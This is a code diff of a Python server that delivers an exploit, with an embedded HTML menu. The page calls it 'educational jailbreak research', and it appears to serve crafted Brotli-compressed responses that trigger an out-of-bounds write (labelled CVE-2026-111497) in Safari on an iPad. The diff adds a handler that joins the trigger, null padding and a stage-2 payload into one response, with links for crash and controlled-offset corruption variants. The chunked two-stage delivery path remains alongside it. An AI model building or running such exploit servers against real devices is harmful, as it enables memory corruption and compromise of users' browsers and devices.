@@ -221,38 +221,52 @@ code { background: #222; padding: 2px 6px; border-radius: 3px; }
 </head>
 <body>
 <h1>CVE-2026-111497 Two-Stage Attack</h1>
-<p class="warn">Educational jailbreak research. Two-stage chunked transfer delivery
-of Brotli OOB write exploit. Stage 1 exhausts block counter, stage 2 controls the
-block switch data for targeted corruption.</p>
+<p class="warn">Educational jailbreak research. Safari fast-path decoder processes
+all data at once, so trigger + stage2 are concatenated in a single response.</p>
 
-<h2>Two-Stage Attacks (Chunked Transfer)</h2>
-<p class="info">These use <code>Transfer-Encoding: chunked</code> to deliver
-stage 1 (trigger) and stage 2 (block switch control) with a delay between them.</p>
+<h2>Combined Attacks (trigger + stage2, single response)</h2>
+<p class="info">Trigger + stage 2 concatenated directly. The decoder exhausts the
+block counter, then reads stage 2 bytes as block switch data.</p>
 
-<a href="/staged/crash">STAGED: Crash (0x7FFFFFFF offset) - 500ms delay</a>
-<a href="/staged/crash-1s">STAGED: Crash - 1000ms delay</a>
-<a href="/staged/controlled/256">STAGED: Controlled OOB at pos=256</a>
-<a href="/staged/controlled/4096">STAGED: Controlled OOB at pos=4096</a>
-<a href="/staged/controlled/-128">STAGED: Controlled OOB at pos=-128 (backward)</a>
+<a href="/combined/crash">COMBINED: trigger + crash stage2 (0x7FFFFFFF)</a>
+<a href="/combined/nopad-crash">COMBINED: trigger + crash stage2 (NO null padding)</a>
+<a href="/combined/controlled/256">COMBINED: trigger + controlled pos=256</a>
+<a href="/combined/controlled/4096">COMBINED: trigger + controlled pos=4096</a>
+<a href="/combined/controlled/-128">COMBINED: trigger + controlled pos=-128</a>
 
 <div class="section">
-<h2>Single-Shot Reference (No Staging)</h2>
-<p class="info">Confirmed working trigger served as single response for comparison.</p>
-<a href="/br/small">SINGLE: Small trigger (55KB, confirmed)</a>
+<h2>Padding Variants (test what decoder reads)</h2>
+<p class="info">Different padding between trigger and stage 2 to find the right
+bit alignment for the block switch data.</p>
+<a href="/combined/pad/0">trigger + 0 pad + stage2</a>
+<a href="/combined/pad/1">trigger + 1 pad + stage2</a>
+<a href="/combined/pad/2">trigger + 2 pad + stage2</a>
+<a href="/combined/pad/3">trigger + 3 pad + stage2 (dimas default)</a>
+<a href="/combined/pad/7">trigger + 7 pad + stage2</a>
 </div>
 
 <div class="section">
-<h2>Stage Analysis</h2>
-<p class="info">Download raw stage bytes for offline analysis.</p>
-<a href="/raw/stage1">RAW: Stage 1 bytes (trigger + padding)</a>
-<a href="/raw/stage2-crash">RAW: Stage 2 bytes (crash variant)</a>
+<h2>Chunked Transfer (for comparison)</h2>
+<p class="info">Safari closes connection before stage 2 arrives (fast-path decoder).</p>
+<a href="/staged/crash">STAGED: chunked crash (broken - Safari closes early)</a>
+</div>
+
+<div class="section">
+<h2>Single-Shot Reference</h2>
+<p class="info">Confirmed working trigger, no stage 2.</p>
+<a href="/br/small">SINGLE: Small trigger (55KB, confirmed corrupted output)</a>
+</div>
+
+<div class="section">
+<h2>Raw Downloads</h2>
+<a href="/raw/stage1">RAW: Stage 1 bytes</a>
+<a href="/raw/stage2-crash">RAW: Stage 2 bytes (crash)</a>
 </div>
 
 <p class="info" style="margin-top: 2em;">
 Server: brotli_staged_server.py | Target: iPad Mini iOS 27.0.1<br>
-Exploit: CVE-2026-111497 Brotli DecodeBlockTypeAndLength OOB Write<br>
-Stage 1: ~55KB (40000 commands, NBLTYPESI=2, symbol 25 block length)<br>
-Stage 2: 127 bytes (block switch control at offsets 7, 15, 19, 23)
+Stage 1: ~55KB (40000 commands, NBLTYPESI=2)<br>
+Stage 2: 127B (block switch at offsets 7,15,19,23)
 </p>
 </body>
 </html>"""
@@ -281,9 +295,44 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             )
             ssl_sock.sendall(resp)
 
+        elif path.startswith("/combined/"):
+            parts = path.split("/")
+            stage2 = stage2_crash
+            trigger = craft_trigger(40000)
+            pad_len = 3  # default dimas padding
+
+            if len(parts) >= 3 and parts[2] == "crash":
+                pad_len = 3
+            elif len(parts) >= 3 and parts[2] == "nopad-crash":
+                pad_len = 0
+            elif len(parts) >= 3 and parts[2] == "pad":
+                try:
+                    pad_len = int(parts[3])
+                except (ValueError, IndexError):
+                    pad_len = 3
+            elif len(parts) >= 4 and parts[2] == "controlled":
+                pad_len = 0
+                try:
+                    pos = int(parts[3])
+                    stage2 = build_stage2_controlled(pos)
+                except (ValueError, IndexError):
+                    stage2 = stage2_crash
+
+            payload = trigger + (b"\x00" * pad_len) + stage2
+            print(f"  -> COMBINED: trigger={len(trigger)}B + {pad_len}pad + stage2={len(stage2)}B = {len(payload)}B")
+
+            headers = (
+                b"HTTP/1.1 200 OK\r\n"
+                b"Content-Type: text/html; charset=utf-8\r\n"
+                b"Content-Encoding: br\r\n"
+                + f"Content-Length: {len(payload)}\r\n".encode()
+                + b"Connection: close\r\n"
+                b"Cache-Control: no-store\r\n\r\n"
+            )
+            ssl_sock.sendall(headers + payload)
+
         elif path.startswith("/staged/"):
             parts = path.split("/")
-            # /staged/crash, /staged/crash-1s, /staged/controlled/<pos>
             delay = 0.5
             stage2 = stage2_crash
 
@@ -300,7 +349,6 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
 
             print(f"  -> STAGED ATTACK: delay={delay}s, stage2={len(stage2)}B")
 
-            # Send response headers with chunked transfer + brotli encoding
             headers = (
                 b"HTTP/1.1 200 OK\r\n"
                 b"Content-Type: text/html; charset=utf-8\r\n"
@@ -311,15 +359,12 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             )
             ssl_sock.sendall(headers)
 
-            # Stage 1: send trigger as first chunk
             print(f"  -> Sending stage 1: {len(stage1)} bytes")
             ssl_sock.sendall(chunk(stage1))
 
-            # Delay: let decoder process stage 1 and exhaust block counter
             print(f"  -> Waiting {delay}s for block counter exhaustion...")
             time.sleep(delay)
 
-            # Stage 2: send crafted block switch bytes as second chunk + terminal
             print(f"  -> Sending stage 2: {len(stage2)} bytes")
             ssl_sock.sendall(chunk(stage2) + chunk_end())
             print(f"  -> Attack sequence complete")
